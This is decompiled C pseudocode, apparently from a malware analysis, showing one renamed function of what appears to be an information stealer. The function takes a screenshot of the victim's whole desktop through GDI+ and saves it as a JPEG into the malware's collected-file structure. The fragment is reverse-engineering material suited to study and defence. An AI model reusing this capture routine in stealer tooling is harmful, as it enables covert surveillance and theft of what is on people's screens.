// #STR: "\\screenshot.jpg"
int __stdcall vdr_capture_victim_desktop_and_save_to_file()
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

  vdr_file_struc = g_vdr_file_struc;
  memset(v5, 0, sizeof(v5));
  v5[0] = 1;
  if ( GdiplusStartup(&v6, v5, 0) || CreateStreamOnHGlobal(0, 1, &ppstm) )
  {
    return 0;
  }
  hwn_desktop = GetDesktopWindow();
  GetWindowRect(hwn_desktop, &Rect);
  hdcDesktop = GetDC(hwn_desktop);
  hdcMemDC = CreateCompatibleDC(hdcDesktop);
  hbmScreen = CreateCompatibleBitmap(hdcDesktop, Rect.right, Rect.bottom);
  h = SelectObject(hdcMemDC, hbmScreen);
  BitBlt(hdcMemDC, 0, 0, Rect.right, Rect.bottom, hdcDesktop, 0, 0, SRCCOPY);
  if ( GdipCreateBitmapFromHBITMAP(hbmScreen, 0, &v12) || vdr_encode_image(v15) == 0xFFFFFFFF || GdipSaveImageToStream(v12, ppstm, v15, 0) )
  {
    return 0;
  }
  GetHGlobalFromStream(ppstm, &phglobal);
  lpbitmap = GlobalLock(phglobal);
  bitmap_size = GlobalSize(phglobal);
  vdr_create_file(vdr_file_struc, lpbitmap, "\\screenshot.jpg", bitmap_size, 3);
  SelectObject(hdcMemDC, h);
  GdipDisposeImage(v12);
  GdiplusShutdown(v6);
  DeleteObject(hbmScreen);
  DeleteObject(hdcMemDC);
  ReleaseDC(hwn_desktop, hdcDesktop);
  CloseWindow(hwn_desktop);
  return 0;
}
